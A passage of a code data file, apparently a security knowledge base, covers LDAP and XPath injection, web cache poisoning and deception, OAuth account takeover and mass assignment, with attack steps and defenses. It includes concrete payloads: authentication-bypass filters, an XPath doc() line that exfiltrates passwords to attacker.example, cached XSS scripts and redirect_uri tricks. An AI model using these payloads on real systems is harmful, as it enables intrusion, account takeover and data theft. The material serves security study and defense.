      },
      {
        heading: 'Filter bypasses and defenses',
        body: [
          'Weak defenses only strip the literal key __proto__ once, so reach the prototype through constructor.prototype instead, or nest the key so a single non recursive pass leaves a second copy (for example __proto__.__proto__ or a wrapper key). Real fixes: freeze the prototype with Object.freeze(Object.prototype), build lookup objects with Object.create(null) or a Map so there is no chain to poison, reject __proto__, constructor, and prototype keys before any merge, and validate JSON against a schema. Keep jQuery (3.4.0+) and Lodash (4.17.11+) patched.',
        ],
        examples: [
          { code: "Filter bypass:  {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}   when __proto__ is blocked", note: 'constructor.prototype resolves to the same Object.prototype.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'PortSwigger Server-Side Prototype Pollution scanner and the DOM Invader tool in Burp find both server and client variants automatically. proto-find and ppmap help locate client-side gadgets, and ppfuzz fuzzes for pollutable parameters. On the defensive side, lockdown or eslint rules flag __proto__ usage and unsafe merges.',
        ],
      },
    ],
    stride: {
      elevation_of_privilege: {
        weaponization: [
          'Forge authorization flags such as isAdmin, role, or isAuthenticated on the prototype so ownership and role checks that read a missing property receive the attacker value and pass.',
          'Reach server-side remote code execution by polluting child_process options (shell, argv0, env, NODE_OPTIONS) that a later spawn, exec, or fork call trusts.',
          'Poison a template engine internal (a Handlebars pre-parsed AST, a Pug block, an EJS outputFunctionName or escapeFunction) so the next render compiles and runs attacker code.',
          'Overwrite the inherited defaults of security relevant objects so an access check that falls through to the prototype value grants access it should not.',
        ],
        why: 'Because the prototype feeds every object, a forged flag satisfies checks the attacker never owned, and Node gadgets that read options from the prototype convert an invisible pollution write into code execution inside the server process.',
      },
      tampering: {
        weaponization: [
          'Overwrite shared default properties (config flags, feature toggles, option defaults) so every object in the runtime silently reads attacker values.',
          'Change how library code behaves by poisoning the options it reads from the prototype, altering how requests are parsed, rendered, or validated for all users.',
          'Persist a poisoned default for the lifetime of the process so later, unrelated requests inherit the tampered state.',
        ],
        why: 'The write lands on the prototype that every object inherits from, so the attacker rewrites the default value of a property across the entire runtime rather than in a single request object.',
      },
      information_disclosure: {
        weaponization: [
          'On the client, chain pollution into DOM XSS by poisoning a property an HTML sink or sanitizer reads (such as a src or template option), running script in the site origin to read the victim session, tokens, and page data.',
          'On the server, use a gadget that reflects a polluted value into the response or into an error message to read internal state.',
          'Poison a property that controls what fields a serializer emits so the response leaks data it would normally omit.',
        ],
        why: 'A client-side gadget that treats a polluted property as trusted markup runs attacker script in the origin, and server gadgets can echo poisoned values, both surfacing data the attacker should never see.',
      },
      denial_of_service: {
        weaponization: [
          'Pollute a property that application or library code assumes is undefined, forcing every subsequent request to throw or loop and taking the process down for all users.',
          'Overwrite a default that core parsing, routing, or serialization depends on so the server errors on normal traffic until it is restarted.',
        ],
        why: 'Because the poisoned default is shared by every object for the life of the process, a single write can make unrelated code paths crash for everyone, not just the attacker.',
      },
    },
  },
  {
    id: 'ldap-injection',
    name: 'LDAP Injection',
    summary: 'Break out of an application built LDAP search filter using filter metacharacters and the wildcard so the directory returns entries it should not, bypassing authentication, forcing an always true filter, or extracting directory attributes one character at a time through blind boolean responses.',
    tags: ['server-side', 'injection'],
    executionContext: {
      where: 'Inside the LDAP directory server (OpenLDAP, Active Directory, 389 Directory Server, ApacheDS) when it evaluates the search filter. The application on the app server concatenates input into an LDAP filter string, but the injected filter logic is parsed and executed by the directory server against its own entries.',
      detail: 'An LDAP search filter is written in prefix notation, for example (&(uid=USER)(userPassword=PASS)), and the directory server returns the entries that match. A vulnerable application builds this string by pasting user input between the parentheses and sends it off to the directory. If the input is not escaped, the attacker supplies their own filter metacharacters, the parentheses ( and ), the boolean operators & (AND), | (OR), and ! (NOT), the wildcard *, and the comparison operators, so the meaning of the whole filter changes. The concatenation bug lives in the app code, but the altered filter is parsed and evaluated by the directory server, so that is where the attack actually executes and where it is decided which entries match and come back. Directory servers differ in how they treat a malformed or multi filter injection: some evaluate only the first filter, some raise an error, and some evaluate every filter, which shapes exactly which payloads work against a given target.',
    },
    howTo: [
      {
        heading: 'Recognize the sink and the metacharacters',
        body: [
          'The vulnerable pattern is any login, search, or lookup that puts a username, email, or search term straight into an LDAP filter. The characters that give you control are ( ) & | ! * = and the NUL byte. Send a lone * and a lone ) as input: a wildcard that suddenly matches far more entries, or a parse error from the stray parenthesis, both point at an injectable filter.',
        ],
        examples: [
          { code: "App filter:  (&(uid=USERINPUT)(userPassword=PASSINPUT))", note: 'Typical AND filter for a login; both clauses must match.' },
          { code: "Probe:  send  *  as the username and watch for a match, or  )  and watch for an LDAP filter error", note: 'A wildcard match or a syntax error confirms unescaped input reaches the filter.' },
        ],
      },
      {
        heading: 'Authentication bypass with wildcards and always true filters',
        body: [
          'The wildcard * matches any value, so submitting it for both the username and password clauses makes the filter match the first (often administrative) entry. Where you need finer control, inject an LDAP absolute true sub filter (&) or comment out the rest of the filter with a NUL byte so only your clause is evaluated.',
        ],
        examples: [
          { code: "user: *   pass: *   =>  (&(uid=*)(userPassword=*))   matches the first entry and logs you in", note: 'The wildcard satisfies both clauses; you authenticate as whichever entry comes back first.' },
          { code: "user: admin)(&)   =>  (&(uid=admin)(&))(userPassword=...)   the (&) is always true", note: 'Log in as admin without the password on servers that accept the injected always true filter.' },
        ],
      },
      {
        heading: 'Blind boolean extraction of attributes',
        body: [
          'When the response does not show data but does differ between a match and no match (a login succeeds or fails, a page count changes), turn the filter into a series of yes or no questions. Use the wildcard as a suffix to test a prefix of an attribute value, then extend the known prefix one character at a time until the value is fully recovered.',
        ],
        examples: [
          { code: "(&(uid=admin)(userPassword=A*))  =>  no match;  (&(uid=admin)(userPassword=M*))  =>  match", note: 'The first known character is M; the response difference is the oracle.' },
          { code: "Continue:  userPassword=MA*, MB*, ... MY*  then  MYs*  ...  to recover the value left to right", note: 'Each matching prefix reveals the next character of the secret attribute.' },
        ],
      },
      {
        heading: 'Enumerate users, attributes, and objects',
        body: [
          'Beyond a single value, injection lets you ask the directory what exists. Inject an OR clause with a wildcard to broaden the result set, test whether a given attribute is present on an entry with attr=*, and walk objectClass and common attributes (cn, sn, mail, uid, memberOf, userPassword) to map accounts and groups.',
        ],
        examples: [
          { code: "user: *)(|(uid=*   =>  widens the filter with an OR so every entry matches and is returned", note: 'Turns a scoped lookup into a directory dump where results are reflected.' },
          { code: "Presence test:  (&(uid=victim)(memberOf=*))   match means the account is in some group", note: 'Probe attribute existence to profile accounts and privileges.' },
        ],
      },
      {
        heading: 'Escaping, server quirks, and defenses',
        body: [
          'The fix is to escape the LDAP special characters in every value before building the filter: ( becomes \\28, ) becomes \\29, * becomes \\2a, \\ becomes \\5c, and NUL becomes \\00, and to use the platform LDAP encoding helper rather than string concatenation. Remember server behavior varies: OpenLDAP tends to evaluate only the first filter, Microsoft AD LDS often errors on multiple filters, and some servers evaluate all of them, so tune payloads to the target. Enforce least privilege on the bind account and validate input against an allow list.',
        ],
        examples: [
          { code: "Escape map:  ( => \\28   ) => \\29   * => \\2a   \\ => \\5c   NUL => \\00", note: 'Encoding these neutralizes the filter metacharacters so input stays data.' },
        ],
      },
      {
        heading: 'Tools',
        body: [
          'The PayloadsAllTheThings LDAP_FUZZ and LDAP_attributes lists drive an intruder style attack in Burp or ffuf to find injectable parameters and to brute the blind extraction. ldapsearch confirms findings directly against the directory once you understand the filter, and a Burp Intruder cluster bomb automates the character by character recovery.',
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Authenticate as a chosen user by injecting a wildcard or an always true (&) sub filter so the password clause is satisfied without the real password.',
          'Log in as the first or any valid directory entry by making both the user and password clauses match with the wildcard.',
          'Comment out the password clause with a NUL byte so only the attacker controlled username clause is evaluated.',
        ],
        why: 'The directory server decides which entry matches the filter, so an injected always true clause makes it return a valid or privileged entry and the application treats the attacker as that authenticated identity.',
      },
      information_disclosure: {
        weaponization: [
          'Extract attribute values such as userPassword, mail, hashes, and tokens one character at a time using wildcard prefix matching and boolean true or false responses.',
          'Enumerate which users, groups, objectClasses, and attributes exist by injecting filters like (attr=*) and observing which entries match.',
          'Widen a scoped filter with an injected OR clause so it returns entries and attributes the query was never meant to expose.',
        ],
        why: 'The attacker rewrites the search filter the directory evaluates, so they can ask the directory yes or no questions about any attribute and rebuild secret values from the pattern of matches.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Defeat an authorization filter that checks group or role membership by injecting an always true clause or dropping the membership condition, so a normal user passes an admin only gate.',
          'Combine an authentication bypass with a filter that selects an administrative entry to obtain a privileged session.',
        ],
        why: 'When access control is expressed as an LDAP filter, injecting filter logic lets the attacker satisfy a privileged condition they do not actually meet, upgrading their access.',
      },
    },
  },
  {
    id: 'xpath-injection',
    name: 'XPath / XQuery Injection',
    summary: 'Inject XPath metacharacters into a query built from user input so the engine selects nodes it should not, bypassing authentication with an always true expression or extracting the whole XML document node by node through blind boolean and out of band techniques.',
    tags: ['server-side', 'injection'],
    executionContext: {
      where: 'Inside the XPath or XQuery engine on the application server (or the XML database) as it evaluates the expression against the backing XML document. The app concatenates input into an XPath string, and the injected expression is parsed and run by the XPath processor over the XML data store.',
      detail: 'XPath is the query language for selecting nodes in an XML document, and applications use it to look users or records up in an XML data store or an XML configuration file. A vulnerable app builds the expression by concatenating input, for example //user[name/text()=INPUT and password/text()=INPUT]. Because XPath has no notion of accounts or table privileges, and because many older XPath APIs offer no equivalent of parameterized queries, injected metacharacters (the quote characters, the square brackets, the boolean operators or and and, the functions, and the union operator |) change which nodes are selected. Building the string happens in the app, but the query is parsed and run inside the XPath engine against the entire XML document, so a successful injection can reach every node in that document, not just the record the developer intended. Unlike SQL there are no per table permissions to stop you, so once you can inject the whole XML tree is reachable.',
    },
    howTo: [
      {
        heading: 'Spot the XPath sink',
        body: [
          'The vulnerable pattern is a login or lookup that matches user input against nodes in an XML file, common in legacy apps and appliances that store users in XML. Send a single quote and a bracket as input: an error mentioning XPath, XML parsing, or an unbalanced expression tells you the input is concatenated into the query.',
        ],
        examples: [
          { code: "App query:  string(//user[name/text()='INPUT' and password/text()='INPUT']/account/text())", note: 'Both predicates must be true to return the account node.' },
          { code: "Probe:  send  '  and watch for an XPath or XML parse error", note: 'A broken expression error confirms the quote reaches the query unescaped.' },
        ],
      },
      {
        heading: 'Authentication bypass with tautologies',
        body: [
          'Close the string literal and add an always true clause with or so the predicate matches regardless of the real credentials. The engine then returns the first matching user node and the app authenticates you as that account. Match a specific privileged user by adding a contains() or position() condition.',
        ],
        examples: [
          { code: "name: ' or '1'='1   =>  //user[name/text()='' or '1'='1' and password/text()='' or '1'='1']", note: 'The or short circuits the predicate to true and the first user node is returned.' },
          { code: "name: ' or contains(name,'adm') or '   selects the admin account without its password", note: 'Steer the match toward a chosen privileged node.' },
        ],
      },
      {
        heading: 'Blind boolean extraction',
        body: [
          'When the page only tells you whether the login or lookup succeeded, use that as a boolean oracle. Recover the length of a value with string-length(), then read it one character at a time with substring() comparisons, walking left to right until the whole value is known.',
        ],
        examples: [
          { code: "' or string-length(//user[position()=1]/password)=8 or '   =>  true when the password is 8 chars", note: 'Find the length first to bound the character search.' },
          { code: "' or substring(//user[position()=1]/password,1,1)='a' or '   iterate a..z,0..9 for each position", note: 'Each true answer confirms the next character of the secret.' },
        ],
      },
      {
        heading: 'Enumerate the XML tree',
        body: [
          'Because there is no fixed schema to lean on, rebuild the document structure with count() and name(). Count the root and its children, then read element names character by character to learn field names, which tells you exactly which nodes hold the interesting data.',
        ],
        examples: [
          { code: "' or count(/*)=1 or '   then  ' or count(/*[1]/*)=2 or '   maps root and child counts", note: 'Reconstruct the tree shape one count at a time.' },
          { code: "' or substring(name(/*[1]/*[1]),1,1)='u' or '   reads the first element name letter by letter", note: 'Recover node names so later queries can target them precisely.' },
        ],
      },
      {
        heading: 'Out of band exfiltration and file read',
        body: [
          'Where the engine is XPath 2.0 (or XQuery), the doc() and doc-available() functions fetch a URL, giving a fast out of band channel: concatenate stolen data into an attacker URL and read it from your logs or DNS, which beats slow boolean extraction. The same doc() with a file scheme can read local files reachable by the engine. When output is reflected, a union with | dumps whole node sets at once.',
        ],
        examples: [
          { code: "doc(concat('http://attacker.example/x/', //user[1]/password))   exfiltrates the value in a request", note: 'One request leaks the data; no per character oracle needed on XPath 2.0.' },
          { code: "') or 1=1] | //user/password[('   returns every user node and password when results are shown", note: 'Union injection dumps entire node sets in a single reflected response.' },
        ],
      },
      {
        heading: 'Tools and defenses',
        body: [
          'xcat automates blind XPath 2.0 extraction including out of band and file read, xxxpwn and xpath-blind-explorer handle character by character recovery, and XmlChor drives enumeration. Fix it by using a precompiled parameterized XPath (XPath variables) instead of string concatenation, escaping quotes in any value that must be inlined, and validating input against an allow list; storing credentials in XML at all is worth revisiting.',
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Bypass authentication with an always true expression (or (quote)1(quote)=(quote)1, or true()) so the node lookup returns a valid user and the app logs you in as them.',
          'Select a specific privileged account (for example the first user, or one matched by contains(name,\"adm\")) without knowing the password.',
        ],
        why: 'The XPath engine decides which user node the credentials match, so a tautology forces it to return an account and the application authenticates the attacker as that identity.',
      },
      information_disclosure: {
        weaponization: [
          'Read any value in the XML document character by character using substring() and boolean true or false responses (blind XPath).',
          'Reconstruct the document tree by counting child nodes and reading element names with count() and name().',
          'Exfiltrate data out of band with the XPath 2.0 doc() function to an attacker URL, avoiding slow per character extraction.',
          'Dump entire node sets at once with a union (|) injection when the output is reflected in the response.',
          'Read local files reachable by the engine with doc() and a file scheme where XPath 2.0 is available.',
        ],
        why: 'XPath has no table level access control, so an injected expression can walk and read the whole XML document, and boolean or out of band channels rebuild the data even when it is never shown directly.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Combine an authentication bypass with selection of an administrative node to obtain a privileged session.',
          'Alter an authorization expression that checks a role or flag stored in the XML so a normal user satisfies an admin only condition.',
        ],
        why: 'When access decisions are made by matching nodes in XML, injecting expression logic lets the attacker match a privileged node they should not, raising their access.',
      },
    },
  },
  {
    id: 'web-cache-poisoning',
    name: 'Web Cache Poisoning & Deception',
    summary: 'Abuse the gap between what a shared cache keys on and what actually changes a response, either to store an attacker controlled response that is then served to every visitor (poisoning) or to trick the cache into storing a victim private authenticated response under a URL the attacker can fetch (deception).',
    tags: ['server-side', 'infrastructure'],
    executionContext: {
      where: 'In a shared HTTP cache in front of the application: a CDN edge, a reverse proxy, or the origin own cache layer. The cache decides what to store and who to serve it to based on a cache key; the attack executes in that caching layer, not in the browser and not in the application logic. Poisoning plants an attacker response under a normal victim cache key; deception stores a victim sensitive response under an attacker reachable key.',
      detail: 'A shared cache stores a response once and serves it to many users. It decides identity with a cache key, normally built from the method, host, and path and sometimes a few query parameters. Anything else that changes the response but is not part of that key is an unkeyed input: certain request headers, cookies, extra parameters, or parsing quirks. That gap is the whole attack surface. In poisoning, the attacker sends a request whose keyed part matches a page real users request, but whose unkeyed part (an X-Forwarded-Host header, a duplicate parameter, a fat GET body) makes the origin produce a malicious response, which the cache then hands to everyone who requests that page. In deception, the attacker makes a mismatch between how the cache computes the key and how the origin routes the request (a static looking extension, an encoded path segment, a delimiter) so that a private authenticated page is stored under a URL that looks cacheable and static, and the attacker retrieves it anonymously. The application only generates the reflected or sensitive content; the cache does the storing and the cross user serving, which is why the flaw lives in the caching layer.',
    },
    howTo: [
      {
        heading: 'Read the cache and find unkeyed inputs',
        body: [
          'First confirm a page is cached and learn what the key is. Response headers give it away: X-Cache with hit or miss, an Age that climbs, and Cache-Control and Vary. Vary lists request headers that ARE part of the key, so anything not listed is a candidate unkeyed input. Add a unique cache buster query parameter on every test request so you probe the cache without poisoning the entry real users share, then hunt for headers and parameters that change the response but not the key with a tool like Param Miner.',
        ],
        examples: [
          { code: "Signals:  X-Cache: hit,  Age: 118,  Cache-Control: public, max-age=300,  Vary: Accept-Encoding", note: 'A hit that is not varied on your injection point means an unkeyed input can poison the shared entry.' },
          { code: "Safe testing:  GET /path?cb=RANDOM  on every probe so your poison lands only in your own buster keyed entry", note: 'The cache buster isolates the test entry until you have a working payload.' },
        ],
      },
      {
        heading: 'Poison through unkeyed headers',
        body: [
          'The classic primitive is a header the origin trusts to build absolute URLs or redirects but the cache does not key on. X-Forwarded-Host (and X-Host, X-Forwarded-Scheme) frequently flows into canonical links, redirects, and script or resource URLs. Point it at your domain and the cached page redirects or loads resources from you for everyone. If the header value is reflected into HTML without encoding, escalate to stored cross site scripting that is served from the cache to every visitor.',
        ],
        examples: [
          { code: "Redirect poison:  GET / HTTP/1.1   Host: target.example   X-Forwarded-Host: attacker.example", note: 'The origin templates the forwarded host into a redirect or canonical URL; the cache serves it to all users.' },
          { code: "Cached XSS:  X-Forwarded-Host: a.\"><script>alert(document.domain)</script>", note: 'An unkeyed header reflected unencoded becomes stored XSS delivered by the cache.' },
        ],
      },
      {
        heading: 'Advanced poisoning: fat GET, cloaking, normalization',
        body: [
          'When headers are keyed, attack the parameter and parsing layer. A fat GET sends parameters in the body of a GET so the cache keys the URL while the origin reads the body. Parameter cloaking abuses server specific separators (some stacks split on a semicolon as well as an ampersand) so the cache sees one value and the app another. Cache key normalization differences let you poison too: a CDN may lowercase the Host for the key but forward the original casing, or cache on a path it has not fully decoded while the origin decodes it to something else, and cacheable error responses (a 400 from an illegal header) can be planted on a good URL.',
        ],
        examples: [
          { code: "Fat GET:  GET /page?x=safe HTTP/1.1   body:  x=malicious   (cache keys ?x=safe, origin uses the body)", note: 'The keyed URL and the processed value disagree, so a benign looking URL caches a hostile response.' },
          { code: "Cloaking:  GET /page?keyed=ok;unkeyed=payload   where the cache sees keyed=ok but the app parses the semicolon", note: 'Server specific delimiters hide an injected parameter from the cache key.' },
        ],
      },
      {
        heading: 'Denial of service by caching a broken response',
        body: [
          'You do not need injection to weaponize the cache: make the origin emit a broken response and get it cached on a URL everyone needs. Override the method to HEAD on a static asset so the cached 200 has an empty body and the bundle breaks, or force a cacheable error and, if a PURGE is exposed, flush the good entry to force a repoison on demand.',
        ],
        examples: [
          { code: "DoS bundle:  GET /main.js HTTP/1.1   X-HTTP-Method-Override: HEAD   -> cacheable 200 with Content-Length: 0", note: 'Every user then loads an empty script and the UI fails for all of them.' },
        ],
      },
      {
        heading: 'Cache deception: steal private pages',
        body: [
          'Deception flips the goal: get a victim authenticated response stored where you can read it. Caches often decide an object is static from a file extension or a path prefix rather than the real content type, so append a static looking suffix or an extra path segment to a dynamic authenticated endpoint. When the browser and the CDN and the origin normalize paths differently, an encoded traversal segment reaches a sensitive endpoint while the cache stores it under the static looking prefix. Client side path traversal in a single page app that attaches an auth header can normalize a fetch to a token endpoint with a css extension, caching the token publicly. Remember SameSite: default Lax cookies are not sent on cross site subresource requests, so seed the victim cache through a top level navigation or redirect, not an img or script tag.',
        ],
        examples: [
          { code: "Extension confusion:  /account/profile/nonexistent.js  -> the cache stores the private profile as a .js asset", note: 'The origin serves the profile for the victim session; the cache keeps it under a public static URL.' },
          { code: "Encoded traversal:  /static/%2e%2e/api/me   or   /api/me;.css   -> CDN caches, origin decodes to the sensitive route", note: 'Divergent path normalization stores authenticated JSON under a cacheable key you can fetch anonymously.' },
        ],
      },
      {
        heading: 'Detection, defenses, tools',
        body: [
          'Detect by watching for X-Cache hits and a rising Age on responses that should be user specific, by 4xx or 5xx responses that persist across normal requests, and by secrets that appear at publicly reachable cache URLs. Defend by normalizing every input before building the key, adding sensitive headers to Vary, marking user specific responses Cache-Control: private and no-store, not caching error responses, requiring the extension to match the content type before caching, and disabling method override. Param Miner finds unkeyed inputs, and toxicache, Web Cache Vulnerability Scanner, and CacheDecepHound automate poisoning and deception discovery across URL lists.',
        ],
      },
    ],
    stride: {
      tampering: {
        weaponization: [
          'Store an attacker controlled response for a keyed URL so every visitor receives injected markup, a swapped script or resource, or a hostile redirect via an unkeyed header such as X-Forwarded-Host.',
          'Reflect an unkeyed header value unencoded into cached HTML to deliver stored cross site scripting from the cache to all users of a page.',
          'Use a fat GET, parameter cloaking, or a cache key normalization mismatch to make a benign looking URL cache a response the attacker controls.',
        ],
        why: 'The cache serves one stored response to every user of a keyed URL, so an unkeyed input that changes that response lets the attacker rewrite what an entire audience sees rather than only their own request.',
      },
      information_disclosure: {
        weaponization: [
          'Trick the cache into storing a victim authenticated page (with PII, session data, CSRF tokens, or API keys) under a static looking URL by appending an extension or an extra path segment (cache deception).',
          'Use divergent path normalization (an encoded traversal segment or a delimiter) so the origin returns a sensitive endpoint while the cache keys it as a public static asset.',
          'Chain client side path traversal in a single page app so an authenticated fetch normalizes to a token endpoint with a static extension, caching the token where anyone can read it.',
        ],
        why: 'Deception exploits the cache trusting an extension or prefix over the real content type, so a private per user response gets saved under a key the attacker can request without any credentials.',
      },
      denial_of_service: {
        weaponization: [
          'Override the method to HEAD on a static asset so the cache stores a 200 with an empty body and the bundle breaks for every user.',
          'Force a cacheable error response and plant it on a URL that real users need so they all receive the failure.',
          'Where a PURGE is exposed, flush the healthy entry to trigger an on demand repoison of the broken response.',
        ],
        why: 'Because a single cached entry is served to everyone who requests that URL, planting one broken or empty response takes the page down for all users until the entry expires or is purged.',
      },
    },
  },
  {
    id: 'oauth-account-takeover',
    name: 'OAuth 2.0 / OpenID Connect Abuse',
    summary: 'Exploit validation gaps in the OAuth or OIDC login dance (loose redirect_uri matching, missing state, account linking by unverified email, codes not bound to a client, unenforced PKCE) to steal an authorization code or token, forge or link identities, and take over accounts.',
    tags: ['authentication', 'server-side'],
    executionContext: {
      where: 'Across the redirect dance between three parties: the authorization server (identity provider), the client application (relying party) and its callback endpoint, and the victim browser that carries the code or token. There is no single host; the exploit executes in the browser redirect chain and at the client callback and token exchange endpoints, where redirect_uri, state, and the returned code or token are validated (or not).',
      detail: 'OAuth 2.0 is a delegated authorization protocol and OIDC layers identity on top of it. The weaknesses are almost never in cryptography; they are validation gaps in the flow. The authorization server sends an authorization code to a redirect_uri, and if the client accepts a redirect_uri it did not register exactly, that code can be delivered to an attacker. The state parameter is the CSRF token of the flow, so a missing or unchecked state lets an attacker splice their own code into a victim session or link the victim account to the attacker identity. If the client links or logs in by an email claim it never verified, an account pre created with the victim email absorbs the victim on their first social login. If the authorization code is not bound to the client and redirect_uri, or if PKCE is optional, a stolen code can be redeemed elsewhere. The execution is the browser following the authorize and redirect steps and the client callback and token endpoints trusting parameters they should have checked, so the fix and the flaw both live in that validation, not in the token format.',
    },
    howTo: [
      {
        heading: 'Map the flow and its parameters',
        body: [
          'Pull the provider metadata to learn the endpoints and supported features, then capture a full legitimate flow in a proxy. Note client_id, the exact redirect_uri, scope, response_type, response_mode, state, and where the code or token lands. The metadata tells you whether PKCE, dynamic client registration, and public clients are supported, which shapes the rest of the testing.',
        ],
        examples: [
          { code: "Discover:  GET /.well-known/openid-configuration   and   /.well-known/oauth-authorization-server", note: 'Reveals authorize, token, registration endpoints, supported scopes, PKCE, and auth methods.' },
          { code: "Baseline:  /authorize?response_type=code&client_id=APP&redirect_uri=https://app/cb&scope=openid email&state=RANDOM", note: 'Record the exact redirect_uri and state so you can test how strictly each is validated.' },
        ],
      },
      {
        heading: 'Steal the code via redirect_uri validation flaws',
        body: [
          'The redirect_uri must match a preregistered value exactly. Test every loose match: a substring or suffix check, an attacker domain that contains or is contained by the allowed one, an @ so the real host becomes userinfo, an added path or path traversal on the allowed domain, a wildcard subdomain, or an http downgrade. If the client hosts its own open redirect on the allowed domain, chain it so the code is forwarded to you, or leaked to you through the Referer header when the callback page loads an external resource.',
        ],
        examples: [
          { code: "redirect_uri=https://app.com@attacker.example   or   https://app.com.attacker.example   or   https://attacker.example/app.com", note: 'Three parser tricks that pass a naive contains or startsWith check and deliver the code to the attacker.' },
          { code: "redirect_uri=https://app.com/cb?next=https://attacker.example   chained through the client own open redirect", note: 'The code lands on the allowed host, then the open redirect or Referer leaks it onward.' },
        ],
      },
      {
        heading: 'CSRF the flow: state and forced account linking',
        body: [
          'If state is absent, static, or not checked against the session, the flow is CSRF vulnerable. Complete OAuth with your own provider account to obtain a valid code, then force the victim browser to hit the callback with your code so their logged in session is silently bound to your identity, or, on an add a social login feature, so your identity is linked into the victim account and you can then log in as them.',
        ],
        examples: [
          { code: "Attacker gets code=ATTACKER, then makes victim load  /callback?code=ATTACKER&state=", note: 'With no enforced state the victim session is joined to the attacker identity (login CSRF or account linking).' },
        ],
      },
      {
        heading: 'Pre account takeover via unverified email and mutable claims',
        body: [
          'Many relying parties key identity on the email claim instead of the stable issuer plus subject pair, and many providers will assert an email the user never proved. Create an account at the target with the victim email before they ever sign in. When the victim later uses social login, the app matches the existing account by email and links or logs them straight into the account the attacker already controls. Check whether email_verified is even present or honored.',
        ],
        examples: [
          { code: "1) register victim@corp.com with a password (email left unverified)   2) victim later clicks Sign in with Google   3) app auto links by email", note: 'The attacker owned pre account absorbs the victim; identity should bind to iss plus sub, not a mutable email.' },
        ],
      },
      {
        heading: 'Code and token handling flaws',
        body: [
          'Test the token exchange itself. An authorization code should be single use, short lived, and bound to the client and redirect_uri that requested it. Redeem a code twice, redeem it after several minutes, and fire parallel redemptions to test single use under a race. Try exchanging a code captured from application A at application B token endpoint; if it works, the code is not bound. Where PKCE is not enforced, redeem a stolen code with no code_verifier. In the implicit flow, tokens ride in the URL fragment and leak through history and Referer, and a token minted for one client that is accepted by another is a client confusion takeover.',
        ],
        examples: [
          { code: "Replay:  POST /token  grant_type=authorization_code&code=STOLEN&client_id=appB&redirect_uri=...", note: 'A code that mints tokens for a different client than it was issued to is unbound and reusable.' },
          { code: "PKCE downgrade:  POST /token with code but no code_verifier  -> tokens issued means PKCE is optional", note: 'A public client without enforced PKCE lets any stolen code be redeemed.' },
        ],
      },
      {
        heading: 'Callback XSS, hidden endpoints, defenses',
        body: [
          'The callback page often reflects error and error_description straight into trusted origin HTML, which is cross site scripting on the login domain, ideal for phishing and token theft. Where dynamic client registration is open, register a client with your own redirect_uri, or point logo_uri, jwks_uri, or sector_identifier_uri at internal hosts for SSRF. prompt=none can suppress the consent screen. Defend by matching redirect_uri exactly, generating and verifying a random state, enforcing single use short lived codes bound to the client and redirect_uri, mandating PKCE for public clients, binding identity to iss plus sub with verified email, keeping tokens out of URLs, and encoding all callback parameters.',
        ],
        examples: [
          { code: "Callback XSS:  /callback?error=x&error_description=<img src=x onerror=alert(document.domain)>", note: 'Reflected on the identity or client origin, this steals in flight codes and tokens.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Steal a victim authorization code by abusing a loose redirect_uri check (substring, @ userinfo, added path, subdomain, or a chained open redirect) and redeem it to log in as them.',
          'Pre create an account with the victim email so that account linking by an unverified email claim binds the victim to an attacker owned account on first social login.',
          'CSRF the flow with a missing or unchecked state to splice the attacker identity into the victim session or link accounts.',
          'Reuse an access token minted for one client against another app that does not validate the token client_id (client confusion).',
        ],
        why: 'OAuth authenticates users, so any gap that hands the attacker the code or token, or that links the victim to an attacker identity, ends with the attacker authenticated as the victim.',
      },
      elevation_of_privilege: {
        weaponization: [
          'Inject or widen scope between the authorization request and the token request where the server trusts the requested scope, obtaining permissions the user never granted.',
          'Register a malicious client through open dynamic client registration with an attacker redirect_uri and a public (PKCE) auth method, then run the victim through it to mint tokens.',
          'Link the attacker identity into a higher privileged victim account so the attacker inherits its roles and access.',
        ],
        why: 'Because tokens carry the scopes and identity that gate access, forcing extra scope or binding to a privileged account turns a normal login into elevated, unauthorized access.',
      },
      information_disclosure: {
        weaponization: [
          'Capture authorization codes or tokens that leak through the Referer header, browser history, or server logs, especially in the implicit flow where the token rides the URL fragment.',
          'Abuse dynamic client registration parameters (logo_uri, jwks_uri, sector_identifier_uri, request_uris) to make the authorization server fetch attacker or internal URLs, disclosing internal responses via SSRF.',
          'Exploit reflected error_description on the callback to run script on the trusted login origin and read in flight secrets.',
        ],
        why: 'The flow moves secrets (codes and tokens) through the browser and lets the server fetch registration URLs, so weak handling leaks those secrets and internal responses to the attacker.',
      },
    },
  },
  {
    id: 'mass-assignment',
    name: 'Mass Assignment (Autobinding)',
    summary: 'Add extra fields the interface never exposes (isAdmin, role, ownerId, balance, emailVerified) to a create or update request so a framework that auto binds the whole request body onto a model writes those privileged or protected properties and persists them.',
    tags: ['server-side', 'api'],
    executionContext: {
      where: 'In the model binding and persistence layer on the application server, at the controller that copies the request body into an object and saves it. The framework binds attacker supplied keys onto a model or entity and the ORM writes them to the database; nothing runs in the browser.',
      detail: 'Many frameworks map request fields directly onto object properties as a convenience: Rails mass assignment, Spring and ASP.NET model binding, Mongoose findByIdAndUpdate with the raw body, Laravel Eloquent with an empty guarded list, Django ModelForm with all fields. When a controller binds the entire request body without an allowlist of which properties a user may set, an attacker simply adds fields that the UI and the documented API never expose. The framework happily assigns them and the ORM persists them, so a self service profile update can set an admin flag, a checkout can set its own price, or an object can be reparented into another tenant. The vulnerable code is the bind and save on the app server, and the persistent effect is a stored record whose privileged or protected fields now hold attacker chosen values. Because binding happens before any business rule runs, the fields that developers assumed were server controlled are quietly writable from the outside.',
    },
    howTo: [
      {
        heading: 'Find the bindable fields',
        body: [
          'You cannot inject a property you do not know exists, so enumerate the model first. A normal read of the object usually returns the full server managed shape, including fields the form never shows. API documentation, GraphQL input types, and the front end JavaScript bundle leak property names and role strings. Submitting an unexpected key with the wrong type can produce an error that confirms the server tried to bind it. Collect the privileged looking names and test them.',
        ],
        examples: [
          { code: "GET /api/users/123  ->  {\"id\":123,\"email\":\"u@x\",\"roles\":null,\"status\":\"ACTIVATED\",\"emailVerified\":false}", note: 'The read exposes roles, status, and emailVerified: candidate fields the update form never shows.' },
          { code: "High value names:  role, roles, isAdmin, permissions, verified, emailVerified, ownerId, organizationId, tenantId, price, balance, status", note: 'These are the properties worth injecting once you confirm the endpoint auto binds.' },
        ],
      },
      {
